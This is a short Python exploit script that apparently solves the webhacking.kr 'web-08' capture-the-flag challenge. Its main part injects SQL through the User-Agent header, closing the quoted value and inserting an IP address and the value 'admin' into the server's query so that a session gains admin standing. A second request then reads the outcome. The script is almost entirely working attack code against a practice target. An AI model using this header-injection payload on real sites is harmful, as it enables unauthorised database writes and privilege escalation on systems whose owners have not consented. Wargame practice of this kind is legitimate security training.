import requests
import json

URL = "https://webhacking.kr/challenge/web-08/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}
headers = {'user-agent':'1234'}

ip ='185.177.125.213'

# achieve my user-agent
# response = requests.get('http://httpbin.org/headers')
# user_agent = json.loads(response.text)['headers']['User-Agent']

user_agent = '1234'
user_agent += f"','{ip}','admin')# blafrom"
print(user_agent)
headers['user-agent'] = user_agent
response = requests.get(URL, cookies=cookies, headers=headers)
print(response.text)

headers['user-agent'] = '1234'
# send regular request with my user-agent
response = requests.get(URL, cookies=cookies)
print(response.text)

